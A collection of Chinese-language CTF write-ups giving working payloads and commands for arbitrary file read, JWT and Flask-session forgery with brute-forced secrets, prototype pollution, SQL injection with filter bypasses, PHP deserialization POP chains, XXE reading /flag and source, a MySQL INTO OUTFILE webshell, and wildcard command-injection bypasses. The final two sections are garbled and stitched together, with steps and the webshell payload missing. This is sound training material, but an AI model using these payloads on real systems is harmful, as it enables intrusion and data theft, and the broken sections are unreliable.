    [RoarCTF 2019] Easy Java — WEB-INF 是 Java 的 /etc/passwd

    题目类型：Java 任意文件读取 — 读 WEB-INF 拿源码与 flag

    Flag：CTF2{a2fddc84-860c-45f0-94ca-f0e41caaa50f}

    题目概述

    题目提示是 Java。先确认技术栈：DevTools → 存储 → Cookie，看到 JSESSIONID，就坐实了。

    页面右上角有个 help，点下去是一个下载功能。这就是这道题的入口。

    解题过程

    Step 1：help 按钮就是一个文件读取点

    点 help，请求长这样：

    /Download?filename=help.docx

    filename 直接当路径用——这就是任意文件读取。

    Step 2：GET 不行，换 POST

    同样的参数，GET 请求没反应。换成 POST：

    curl.exe -s -X POST --data-urlencode "filename=/WEB-INF/web.xml" "http://目标/Download"

    这次出来了。

    原因是 DownloadController 只处理 POST 请求（doPost），doGet 没实现。所以这个点看着像 GET 接口，其实只认 POST。

    Step 3：读 web.xml，找到真正干活的 Servlet

    <servlet>
    <servlet-name>FlagController</servlet-name>
    <servlet-class>com.wm.ctf.FlagController</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>FlagController</servlet-name>
    <url-pattern>/Flag</url-pattern>
</servlet-mapping>

    两个信息：

    FlagController    在 com.wm.ctf 包里
映射到 /Flag       ——但它不直接给你 flag

    flag 写在 FlagController.class 里。

    Step 4：读 class 文件——路径别加前缀

    这里有个坑，我踩了一次。

    Download 的参数是相对 WEB-INF/classes/ 的（servlet 里是 getResourceAsStream("/WEB-INF/classes/" + filename)）。所以：

    ✗ WEB-INF/classes/com/wm/ctf/FlagController.class     ← 重复了前缀，读不到
✓ com/wm/ctf/FlagController.class                      ← 对

    我第一次写的是前者，结果没有任何回显——不是文件不存在，是路径拼出来变成了 /WEB-INF/classes/WEB-INF/classes/...。

    正确请求：

    curl.exe -s -X POST --data-urlencode "filename=com/wm/ctf/FlagController.class" "http://目标/Download" -o flag.class

    Step 5：class 是二进制，要搜里面的明文

    .class 是编译后的字节码，直接在终端里看是一堆乱码。保存成文件后用编辑器打开，在可读区里能看到一段 base64。

    Notepad++ 打开，Ctrl+F 搜 flag 或直接搜 =（base64 结尾常见）：

    ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9

    解码：

    python -c "import base64;print(base64.b64decode('ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9').decode())"

    CTF2{a2fddc84-860c-45f0-94ca-f0e41caaa50f}
    关键点 说明
    判技术栈 Cookie 里有 JSESSIONID → Java
    入口 help → /Download?filename=...
    请求方式 必须 POST，GET 不处理
    必读文件 /WEB-INF/web.xml（Servlet 映射全在里面）
    路径基准 filename 相对 WEB-INF/classes/，别再写这段前缀
    class 文件 二进制，用编辑器/strings 搜 base64 明文
    类比 /WEB-INF 在 Java 里约等于 Linux 的 /etc/passwd
    完整请求 
    # ① 先看 web.xml
curl.exe -s -X POST --data-urlencode "filename=/WEB-INF/web.xml" "http://目标/Download"

# ② 读业务类（注意不要带 WEB-INF/classes 前缀）
curl.exe -s -X POST --data-urlencode "filename=com/wm/ctf/FlagController.class" "http://目标/Download" -o flag.class

# ③ 搜 base64 并解码
# Notepad++ 打开 flag.class，Ctrl+F 搜 ZmxhZ 或 "="
python -c "import base64;print(base64.b64decode('ZmxhZ3thMmZkZGM4NC04NjBjLTQ1ZjAtOTRjYS1mMGU0MWNhYWE1MGZ9').decode())"
    这题踩的坑

    ① 路径加了 WEB-INF/classes/

    源码里已经帮你拼了 "/WEB-INF/classes/"，你再写一遍就变成双层路径，表现是“没有任何回显”，很容易误判成文件不存在。

    ② 用 GET 试

    doGet 没实现，所以 GET 一定空。看到“参数对但没反应”，先换请求方法，再怀疑路径。

    ③ 直接看终端的 class 输出

    二进制里有不可见字符，终端会把内容吃掉或显示成乱码。一定要 -o 存成文件，用编辑器/strings 看。

    ④ 只记 /WEB-INF/web.xml

    web.xml 只告诉你有哪些 Servlet；真正的 flag 在对应的 .class 里。这是两步，不是一步。

    [极客大挑战] 大蒜哥 — JWT 换成 uid=1，再往原型上塞一个 entitlement

    题目类型：JWT 伪造（弱密钥）+ 原型链污染

    Flag：SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}

    题目概述

    注册登录后是个“游戏库”页面。表面上是点卡片启动游戏，实际上真相全在 app.js 里。

    解题过程

    Step 1：先看 token 存在哪

    const TOKEN_KEY = "garlic_vault_token";

function token() {
  return localStorage.getItem(TOKEN_KEY) || "";
}

    JWT 存在 localStorage，键名是 garlic_vault_token。

    控制台里直接看：

    console.log(localStorage.getItem("garlic_vault_token"))

    拿到 token 之后，再看它是怎么发出去的：

    async function api(url, options = {}) {
  const headers = { ...(options.headers || {}) };
  if (token()) headers.Authorization = `Bearer ${token()}`;
  const response = await fetch(url, { ...options, headers });
  const data = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(data.message || "服务器暂时没有响应");
  return data;
}

    所有请求都自动带上 Authorization: Bearer <token>。

    所以只要能改 token 内容，就能以任意身份调用接口。

    Step 2：代码里直接告诉你该改什么

    async function loadVault() {
  try {
    const state = await api("/api/vault");
    if (state.mode === "owner") {
      await api("/api/admin/games");
      return loadOwnerPanel(state.username, state.consoleScript);
    }
    return renderVisitor(state.username);
  } catch (_) {
    return renderLogin();
  }
}

// OWNER PROFILE // GARLIC #001

    两个关键信息：

    state.mode === "owner"  → 才会调 /api/admin/games
// OWNER PROFILE // GARLIC #001   → 管理员是 #001，也就是 uid = 1

    所以目标是：把 JWT 里的 uid 改成 1。

    Step 3：解 token，确认字段

    cd E:\dsh\tools\jwt_tool
python jwt_tool.py "<你的token>"

    解出来：

    username = "12"
uid      = 2333
iat      = 1795410143
exp      = 1795417343
iss      = "garlic-private-server"

    uid: 2333 是普通用户，要改成 1。

    Step 4：爆破签名密钥

    python jwt_tool.py "<你的token>" -C -d "C:\Users\崔路宽\Desktop\dict.txt"

    爆破结果：123123

    （这类题密钥几乎一定是纯数字或常见词，小字典跑几十秒就出。）

    Step 5：用密钥重签 uid=1

    python jwt_tool.py "<你的token>" -I -pc uid -pv 1 -S hs256 -p 123123

    得到的 payload 形如：

    {"username":"12","uid":1,"iat":1795410143,"exp":1795417343,"iss":"garlic-private-server"}

    把新 token 写回 localStorage，然后刷新页面：

    localStorage.setItem("garlic_vault_token", "<新token>")
location.reload()

    刷新后 state.mode 变成 owner，自动进入管理员面板。

    Step 6：面板里的按钮全是装饰

    进去之后点卡片没反应。打开网络面板看，按钮只改了页面上的一行字，根本没发请求。

    真正有用的只有一段代码：

    const gta6Endpoint = "/api/admin/gta6/launch";
const gta6Entitlement = "gta6_play";

async function bootGta6(app, api) {
  const result = await api(gta6Endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ game: "gta6", settings: { quality: "ultra" } })
  });
  output.textContent = result.flag || "GTA6 已启动。";
}

    注意这两个常量：

    端点          POST /api/admin/gta6/launch
权限标识      gta6_play   ← 后端就是看这个

    正常情况下用户没有 gta6_play 这个权限，所以拿不到 flag。

    Step 7：用原型链污染伪造权限

    把请求体里的 settings 换掉，让 gta6_play 出现在原型链上：

    {
  "game": "gta6",
  "settings": { "__proto__": { "gta6_play": true } }
}

    为什么这样能过：

    后端大概率做了把 settings 合并进某个对象（Object.assign / 展开）的动作
合并时 __proto__ 会把 gta6_play 挂到 Object.prototype 上
之后任何对象查 gta6_play 都会命中 → 权限判断通过

    这就是原型链污染：你没有那个字段，但你的原型有。**

    拿 flag 的请求：

    curl.exe -s -X POST "http://目标/api/admin/gta6/launch" `
  -H "Content-Type: application/json" `
  -H "Authorization: Bearer <uid=1的token>" `
  -d '{\"game\":\"gta6\",\"settings\":{\"__proto__\":{\"gta6_play\":true}}}'

    返回里的 flag 字段就是答案：

    {"unlocked":true,"title":"一男一女 / GTA6","flag":"SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}"}

    unlocked: true 这一项就是被污染出来的权限——原本用户并没有 gta6_play。

    环节 关键点
    token 位置 localStorage["garlic_vault_token"]
    发送方式 每个请求自动加 Authorization: Bearer
    身份判断 state.mode === "owner" 才进管理面板
    改名线索 注释 // OWNER PROFILE // GARLIC #001 → uid=1
    密钥 爆破得 123123
    重签 只改 uid，其他字段原样保留
    按钮无效 纯前端装饰，真正接口是 /api/admin/gta6/launch
    权限标识 gta6_play（前端常量名 gta6Entitlement）
    污染点 settings 里的 __proto__
    完整流程 
    # ① 看 token
# 浏览器控制台：localStorage.getItem("garlic_vault_token")

# ② 解析 + 爆破
python jwt_tool.py "<token>" -C -d dict.txt        # → 123123

# ③ 重签 uid=1
python jwt_tool.py "<token>" -I -pc uid -pv 1 -S hs256 -p 123123

# ④ 写回并刷新
# localStorage.setItem("garlic_vault_token","<新token>"); location.reload()

# ⑤ 原型链污染拿 flag
curl.exe -s -X POST "http://目标/api/admin/gta6/launch" `
  -H "Content-Type: application/json" `
  -H "Authorization: Bearer <新token>" `
  -d '{"game":"gta6","settings":{"__proto__":{"gta6_play":true}}}'
    这题踩的坑

    ① 进了面板就到处点

    卡片是纯前端装饰，点了只改页面文字。真正的价值在“网络”面板里那条 console-script / gta6/launch 请求。

    ② 以为改了 uid 就能直接拿 flag

    uid=1 只给你“进门”的资格，gta6_play 这个权限还得自己造——这才是这题的第二个考点。

    ③ 重签时把 iat/exp 写死成旧值

    token 有有效期，改签时最好把 iat/exp 更新到当前时间，否则改完还是过期。

    ④ __proto__ 拼错

    是两个下划线：__proto__。写成 __potor__ 之类的，服务端只会把它当成一个普通字段，什么都不会发生。

    [BCACTF 2024] Michaelsoft Gring — 空格被过滤，就用 Tab

    题目类型：SQLite 联合查询注入 — 空格绕过

    Flag：bcactf{59L_1n1ECTeD_026821}

    题目概述

    题目直接告诉你是 sqlite。这省掉了一大半判断成本——不用再去猜 information_schema 还是 sqlite_master。

    解题过程

    Step 1：确认注入点

    搜索框输入单引号 '，报错。注入点确认。

    Step 2：空格被过滤了

    正常 payload 里的空格全被吃掉，SQL 拼不起来。

    常见的替代方案有三种，但这里只有一种能用：

    替代写法 能不能用 原因
    /**/（注释当空格） ❌ / 在 URL 里会被当成路径分隔符，服务器直接致命错误
    %20 ❌ 就是空格本体，一样被过滤
    %09（Tab） ✅ Tab 在 SQL 里和空格等价，且不在过滤名单里

    所以后面所有 payload 里的空格都写成 %09。

    Step 3：确定列数

    1' UNION SELECT 1--

    URL 编码后：

    1'%09UNION%09SELECT%091--

    只有一列。（多给几列会报错“SELECT 列数不一致”）

    Step 4：爆表（SQLite 的关键点）

    SQLite 没有 information_schema，表结构存在 sqlite_master 里：

    1' UNION SELECT group_concat(name) FROM sqlite_master--

    1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--

    返回：search,flag

    两张表：search 是正常业务表，flag 是目标。

    Step 5：拿 flag——两种做法

    ① 直接查那一列

    1' UNION SELECT group_concat(flag) FROM flag--

    ② 更省事：查建表语句，一次看到表名+列名

    1' UNION SELECT group_concat(sql) FROM sqlite_master--

    返回类似：

    CREATE TABLE flag(flag TEXT)

    看到 flag(flag)，就知道表名和列名都是 flag——一条语句搞定“爆表 + 爆列”。

    最终：

    bcactf{59L_1n1ECTeD_026821}
    关键点 说明
    数据库 题目直接说是 sqlite，省掉指纹判断
    注入点 单引号报错
    空格过滤 用 %09（Tab）替代；/**/ 不行，因为 / 在 URL 里是路径符
    列数 1 列
    表结构 SQLite 用 sqlite_master，字段有 type、name、sql
    一次的取全 group_concat(sql) 能直接拿到建表语句
    注释 -- 后面要跟空格（这里用 --%09 或直接 -- 结尾）
    SQLite 注入速查 
    -- 表清单
SELECT group_concat(name) FROM sqlite_master WHERE type='table'

-- 建表语句（表名+列名一次看全）
SELECT group_concat(sql) FROM sqlite_master

-- 拿数据
SELECT group_concat(flag) FROM flag

    SQLite 没有的东西： 

    information_schema    ✗
load_file()           ✗
INTO OUTFILE          ✗（默认）
    所以 sqlite 题基本是“把库读干净”，不是 getshell。

    这题踩的坑

    ① 用 /**/ 代替空格

    URL 里的 / 会被服务器当路径处理，直接致命错误，请求还没到 SQL 就挂了。这种情况下只能用 %09 或 %0a。

    ② 想查 information_schema

    SQLite 里根本没有这张表。表结构在 sqlite_master。

    ③ 只爆表不爆列

    group_concat(sql) 一条就能同时拿到表名和列名，比先爆表再爆列少两步。

    ④ payload 忘记以 1' 开头

    前面的 1' 是用来闭合原查询的引号的，单写 UNION SELECT 拼进去是语法错误。

    [SWPUCTF 2021 新生赛] pop — 三个魔术方法串一条链

    题目类型：PHP 反序列化 — POP 链构造

    Flag：NSSCTF{5dfdbb3f-1eb4-48c7-a5d7-156a3c6d7cdb}

    题目概述

    源码直接给全，入口就一句：

    $w00m = $_GET['w00m'];
unserialize($w00m);

    三个类、三个魔术方法，全部摊开给你看。

    解题过程

    Step 1：先找终点

    class w44m{
    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd === '08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

    目标是让 Getflag() 执行，并且 $admin === 'w44m'、$passwd === '08067'。

    但 admin 是 private、passwd 是 protected——外部改不了，只能靠反序列化从字符串里重建对象。

    Step 2：倒着找触发点

    Getflag() 不会自己跑，得有人调用它。往上看：

    class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

    __toString() 会把 $this->w00m 当成对象，调用它的 {$this->w22m}() 方法。

    所以：w00m 放 w44m 对象，w22m 放字符串 "Getflag"。

    那 __toString() 又怎么触发？它只在对象被当成字符串时触发。再往上看：

    class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

    __destruct() 里 echo $this->w00m;——把属性当字符串输出。如果 $w00m 是个对象，就会触发它的 __toString()。

    链条闭合了。

    Step 3：链条全貌

    unserialize(w22m 对象)
   → 脚本结束，析构触发 w22m::__destruct()
        → echo $this->w00m（是 w33m 对象）
              → 触发 w33m::__toString()
                   → $this->w00m->{$this->w22m}()  即 w44m->Getflag()
                        → admin/passwd 匹配 → include flag.php

    三个魔术方法各干一件事：

    __destruct    被 echo 一个对象 → 触发 __toString
__toString    动态方法调用，方法名来自属性
Getflag       终点，做条件判断

    Step 4：属性可见性的坑

    w44m 的两个属性一个 private、一个 protected，序列化后的键名必须写成：

    可见性 序列化里的键名 字节数（以 admin 为例）
    public admin s:5:"admin"
    protected \0*\0admin s:8:"\0*\0admin"
    private \0类名\0admin s:11:"\0w44m\0admin"（5 + 1 + 4 + 1 + 5）

    手写很容易数错长度。

    更省事的做法：在本地用类自己的构造函数生成。

    class w44m{
    private $admin;
    protected $passwd;
    public function __construct($admin,$passwd){
        $this->admin = $admin;
        $this->passwd = $passwd;
    }
}

echo serialize(new w44m('w44m','08067'));

    __construct 会把值写进属性，PHP 自己生成的序列化串键名格式一定是正确的。

    注意：是 __construct，不是 __construct__。多写一个下划线，方法不会被调用，而且 PHP 不会报错——你会得到一个属性全是 null 的对象，排查起来很费时间。

    Step 5：拼完整 payload

    用生成的片段替换进链条：

    O:4:"w22m":1:{
  s:4:"w00m";
  O:4:"w33m":2:{
    s:4:"w00m";
    O:4:"w44m":2:{
      s:11:"\0w44m\0admin";  s:4:"w44m";
      s:9:"\0*\0passwd";     s:5:"08067";
    }
    s:4:"w22m";  s:7:"Getflag";
  }
}

    注意 w22m 只声明 1 个属性（它只有 $w00m），w33m 和 w44m 各声明 2 个。

    Step 6：URL 编码

    \0 是空字节，直接放进 URL 会被截断或转义。必须编码成 %00：

    O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D

    请求：

    /index.php?w00m=<上面那串>

    拿到：

    NSSCTF{5dfdbb3f-1eb4-48c7-a5d7-156a3c6d7cdb}
    环节 触发条件 干什么
    w22m::__destruct 脚本结束、对象销毁 echo $this->w00m
    w33m::__toString 对象被当字符串输出 $this->w00m->{$this->w22m}()
    w44m::Getflag 被动态方法调用 校验 admin/passwd，include flag.php
    属性可见性 private/protected 键名要带 \0 前缀，长度精确
    URL 编码 \0 空字节 必须写成 %00
    本地生成 payload 的脚本

    protected $passwd;

    这题踩的坑

    ① 手数 \0 前缀的长度

    \0w44m\0admin 是 11 个字节（1+4+1+5），不是 10 也不是 12。数错一位，整个反序列化失败。

    PHP 不报错，只是不执行。你得到一个属性全 null 的对象，现象是“链条没反应”。魔术方法的名字多一个下划线就不是魔术方法了。

    ③ 忘了 %00 编码

    \0 直接放 URL 里会被吃掉。用 urlencode() 生成最保险。

    ④ w33m 的动态方法名写错

    $this->w00m->{$this->w22m}()——w22m 里放的是方法名字符串 "Getflag"，大小写要跟源码一致。

    [NSSRound#13 Basic] flask?jwt? — 先分清它是谁

    题目类型：Flask session 伪造（签名密钥泄露）

    Flag：NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}

    题目概述

    题名本身就是提示：flask?jwt?——它在问你，这个 session 到底是 Flask 的还是 JWT 的。

    这两者长得像（都是一串点分段的 base64），但处理方式完全不同：

    JWT             三段，第一段是 {"alg":"HS256",...}
Flask session   三段或四段，解出来是 {"_fresh":true,...}

    先分辨清楚，再决定用哪套工具——这一步能省掉大量瞎试。

    解题过程

    Step 1：注册个账号，看 session

    随便注册、登录，抓包看 cookie：

    session=eyJfZnJlc2giOnRydWUs...

    它是三段式，而且解出来是 Python 字典的键名（_fresh、_user_id）——这是 Flask 的 session，不是 JWT。

    用 flask-unsign 解：

    flask-unsign --decode --cookie "<cookie>"

    {'_fresh': True,
 '_id': 'ae8e9db8fb729eeafed37232050214fccc9622e0659ecd9f43975a2a49ca9e26c0f81ca580bf3fe07a890e68021b5b54fffe0e2bc8cb86a30e503a402acbbd02',
 '_user_id': '2'}

    三个键：

    _fresh    这次是不是刚登录的
_id       会话 id（Flask-Login 用来绑定会话）
_user_id  当前用户编号 ← 要改的就是它

    Step 2：点“获取 flag”，提示不是 admin

    说明后端在判断 _user_id 是不是 1。

    那就把 '2' 改成 '1'。

    Step 3：直接改值没用——它是签名过的

    Flask 的 session 是签名 cookie：内容放在客户端，但签名在服务端校验。

    改了内容、签名对不上，服务端直接丢弃整个 session，表现得像“你没登录”。

    所以必须重新签名，而这需要 SECRET_KEY。

    Step 4：一边爆破，一边找提示

    flask-unsign --unsign --cookie "<cookie>" --wordlist E:\dsh\flask\rockyou.txt --no-literal-eval

    --no-literal-eval 是必须的：rockyou 里有纯数字行（比如 123456），默认会被当 Python 字面量解析成整数，然后报 Secret must be a string，爆破直接中断。

    注意这一步是并行的——爆破同时去翻页面。

    在“忘记密码”页面的 HTML 源码末尾，看到一行注释：

    <!-- secretkey: th3flaskisfunny -->

    密钥直接写在页面注释里。

    Ctrl + C 停掉爆破——不用等了。

    Step 5：用密钥重签

    flask-unsign --sign --cookie "{'_fresh':True,'_id':'ae8e9db8...503a402acbbd02','_user_id':'1'}" --secret "th3flaskisfunny"

    三个必须注意的：

    ① 整个字典都要写，不能只写 _user_id
   _fresh 和 _id 缺了，Flask-Login 认为会话不完整，直接不认
② 值保持字符串：'1' 而不是 1
③ PowerShell 里用双引号包整块，里面用单引号

    把输出的值替换 cookie，刷新页面再点一次“获取 flag”：

    NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}
    关键点 说明
    判断类型 解第一段：{"alg":...} 是 JWT，{"_fresh":...} 是 Flask
    Flask session 内容在客户端，签名在服务端，改值必须重签
    三个键 _fresh / _id / _user_id，重签时一个都不能少
    爆破参数 --no-literal-eval（否则数字行会中断爆破）
    密钥来源 页面 HTML 注释：<!-- secretkey: th3flaskisfunny -->
    提权动作 _user_id 从 2 改成 1
    完整流程 
    # ① 解码
flask-unsign --decode --cookie "<cookie>"

# ② 爆破（可被下面的源码提示中断）
flask-unsign --unsign --cookie "<cookie>" --wordlist E:\dsh\flask\rockyou.txt --no-literal-eval

# ③ 用泄露的密钥重签
flask-unsign --sign --cookie "{'_fresh':True,'_id':'ae8e...','_user_id':'1'}" --secret "th3flaskisfunny"
    这题踩的坑

    ① 把 Flask session 当 JWT 打

    jwt_tool 会直接报 Not 3 parts（四段）或解析出一堆 _fresh 之类的键。两个工具不通用，先判断再选。

    ② 在 rockyou 上干等

    1400 万行要跑很久。--no-literal-eval 不加还会直接崩。正确做法是同时翻页面——这题的密钥就在注释里。

    ③ 只写 _user_id 去签名

    Flask-Login 需要 _fresh 和 _id，缺一个就判会话无效。重签是“整块重写”，不是“打补丁”。

    ④ 写成 1 而不是 '1'

    类型不一致，比较可能失败。原来是什么类型就保持什么类型。

    [NCTF2019] Fake XML cookbook — 名字就是答案

    题目类型：XXE（XML 外部实体注入）

    Flag：CTF2{72a5521b-e903-46b6-a937-056b82c51205}

    题目概述

    题名里直接写着 XML。

    这种“名字就是考点”的题，先别急着找别的洞——就按它说的方向走。

    解题过程

    Step 1：确认请求体是 XML

    页面源码里翻到登录逻辑，提交方式很明确：

    var data = "<user><username>" + username + "</username><password>" + password + "</password></user>";
$.ajax({
  type: "post",
  url: "doLogin.php",
  contentType: "application/xml",
  data: data
})

    三件事对上了：

    请求体是 XML           ← 拼接出来的标签结构
Content-Type 是 xml    ← application/xml
数据直接拼进去          ← 没有转义

    XML + 可控输入 = 先试 XXE。

    Step 2：加声明和引用，验证漏洞

    抓包，把请求体改成：

    <!DOCTYPE user [ <!ENTITY x "12"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    返回里 msg 变成了 12——说明实体被解析了，DTD 是生效的。

    第一步验证完成：这里能定义实体，也就能定义外部实体。

    Step 3：先读源码，确认为什么登录没用

    响应头带着 PHP，所以可以用 PHP 的伪协议。

    但要注意一个前提：外部实体读的是“文件原文”，不会经过 PHP 解析。想读源码就必须先 base64 编码，否则 <?php ... ?> 会被当成 XML 标签吞掉。**

    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    把返回的 base64 解出来，就是 doLogin.php 的源码：

    $USERNAME = 'admin';
$PASSWORD = '024b87931a03f738fff6693ce0a78c88';
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try {
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $username = $creds->username;
    $password = $creds->password;

    if ($username == $USERNAME && $password == $PASSWORD) {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 1, $username);
    } else {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 0, $username);
    }
} catch (Exception $e) {
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 3, $e->getMessage());
}

    两个关键配置：

    libxml_disable_entity_loader(false);   // 允许加载外部实体
LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD

    这就是漏洞的根源。

    Step 4：账号密码是假的线索

    源码里确实有账号和 md5 密码，但登进去没有任何东西——flag 不在数据库里，在文件系统上。

    所以这条路走完就丢掉，别在登录上耗时间。

    Step 5：直接读 flag

    把 resource= 换成 flag 文件即可：

    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    base64 解码：

    CTF2{72a5521b-e903-46b6-a937-056b82c51205}

    如果 flag 文件里都是纯文本、没有 <，也可以直接 SYSTEM "file:///flag"，省掉编码这一步。

    关键点 说明
    识别 题名 + Content-Type: application/xml + 拼接请求体
    验证 内部实体 <!ENTITY x "12"> 能生效，就说明 DTD 没关
    读源码 php://filter/read=convert.base64-encode/resource=xxx
    为什么编码 外部实体读的是原文，<?php 会破坏 XML 结构
    漏洞根源 libxml_disable_entity_loader(false) + LIBXML_NOENT
    登录没用 账号密码是真的，但 flag 不在库里
    完整 payload 
    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    POST /doLogin.php
Content-Type: application/xml
    这题踩的坑

    ① 只声明实体，不写 &x;

    实体是“登记”，引用才是“取值”。不引用，服务器根本不会去读文件。

    ② 用 file:// 读 PHP 源码

    读到的是原文，但 <?php 会被当成 XML 标签，解析直接炸。读源码必须走 php://filter + base64。

    ③ 拿账号密码去登录

    那是干扰项。flag 在文件里，不在数据库里。

    ④ 忘了 LIBXML_NOENT

    源码里 loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD) —— 少了 LIBXML_NOENT 实体不会被替换，你只能看到 &x; 本身。

    星辉魔女名鉴 — 库里没有 flag，那就写一个 shell 进去

    题目概述

    页面底部有个“终端”入口，进去是一块维护控制台。提示是日语的，先翻译：

[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)

    Step 2：确定列数

    原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：

    0 UNION SELECT 1,2,3,4,5,6

    能正常返回，说明列数对上了。

    Step 3：爆库表列

    6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -

    Step 4：库里的“flag”是假的

    注意它自己写着 d3c0y_..._d0_n0t_submit——这是诱饵，交上去就是错的。**

    这题的 flag 不在数据库里。

    /var/www/html/io/

    @@secure_file_priv 就是 MySQL/MariaDB 允许 INTO OUTFILE 写入的目录——和终端里那行提示完全对上了。

    这说明出题人是故意把这条路留给你。

    Step 6：写一个 webshell

    ① 路径用 @@secure_file_priv 给的那个，不能写别处

   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
④ 所以用 $_GET[0] 这种不带引号的写法最保险

    访问：

    /io/C.php?0=cat%20/flag

    得到：

    MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
    关键点 说明
    注入点 筛选条件 rarity，单引号报错确认
    列数 原查询 6 列，UNION 也要 6 列
    注释 -- -（-- 后必须空格），用来吃掉 ORDER BY
    提示的价值 终端已告知 /io/ 可写
    写权限目录 @@secure_file_priv = /var/www/html/io/，与提示吻合

    诱饵 archive_notes 里的 d3c0y_... 是假的，别交

    是 INFORMATION_SCHEMA。拼错不会报注入失败，只会返回空——很容易误判成“表不存在”。

    $_GET["cmd"] 写进文件会变成 $_GET[\"cmd\"]，PHP 直接语法错误。用 $_GET[0] 或 $_GET[cmd]。

    INTO OUTFILE 不允许覆盖已存在文件。写失败就换个名字（C.php → D.php）。

    ⑤ 交了诱饵 flag

    archive_notes 里那条自己写着 d0_n0t_submit。库里没有真 flag，必须有写文件这一步。

    Flag：MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}

    这就是突破口。

    解题过程

    Step 1：先看哪些字符还能用

    字符 状态 用处
    ; ✅ 没拦 串联多条命令（这是整题的前提）
    ? ✅ 没拦 单字符通配符
    * ✅ 没拦 多字符通配符
    / ✅ 没拦 路径分隔
    $ ( ) 反引号 ❌ 拦了 不能用命令替换 $(...)
    引号 ❌ 拦了 不能写字符串
    \| & ❌ 拦了 不能用管道和后台

    注意 \b 是词边界——它匹配的是“完整的单词”，比如 cat 作为独立词出现才算。

    这也意味着：只要让 cat 不以“完整单词”的形式出现，就能绕过去。

    Step 2：命令名和文件名都得“变形”

    要执行的两样东西，都在黑名单里：

    命令 cat        → 被拦
参数 /flag      → 里含 flag，被拦

    所以思路是：两个都用通配符拼出来，让它们的字面形式里既没有 cat 也没有 flag。**

    Step 3：/bin/ca? 为什么能变成 /bin/cat

    shell 执行命令时走 PATH，cat 实际指向 /bin/cat。

    所以直接写绝对路径就够了：/bin/cat。

    但这串里含 cat（/bin/cat 结尾就是 cat），照样被 \b 拦。

    那就把最后一个字符换成通配符：

    /bin/ca?

    shell 在展开通配符时，会去 /bin 目录里找所有“ca 开头、后面一个字符”的文件。

    /bin 下以 ca 开头的只有 cat——所以 ? 精准匹配到它。

    而字符串 /bin/ca? 里没有 cat 这三个连续字符，正则匹配不到。

    Step 4：/fla? 匹配 /flag

    同理，参数里的 flag 也要拆：

    /fla?

    文件系统里以 fla 开头的目标文件就是 /flag，? 匹配那个 g。

    字符串里没有 flag 这个完整单词，\b 拦不住。

    Step 5：拼起来

    ;/bin/ca? /fla?

    ; 是命令分隔符——前面可以什么都没有（或者接在一个已有参数后面），后面接我们的命令。

    为什么需要 ;：注入点通常在一段已有的 shell 语句里，前面不加分隔符，你写的命令会被当成前一条命令的参数。**

    请求一次，回显里直接看到：

    [2026-11-20 07:02:14] ;/bin/ca? /fla?
MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}

    顺便，;id 也能跑：

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

    说明命令确实执行了，不是回显注入。

    关键点 说明
    黑名单方式 关键词用 \b 词边界匹配，符号全部拉黑
    可用字符 ; ? * / = 空格
    ; 的作用 串联命令，把注入的命令和原语句分开
    通配符绕过 /bin/ca? → /bin/cat，字面量里不出现 cat
    参数绕过 /fla? → /flag
    为什么 ? 精准 /bin 下以 ca 开头的只有 cat；/ 下以 fla 开头的只有 flag
    还有其他可用姿势

    echo 不在黑名单里，可以直接列目录（不需要 ls）：

    ;echo /f*
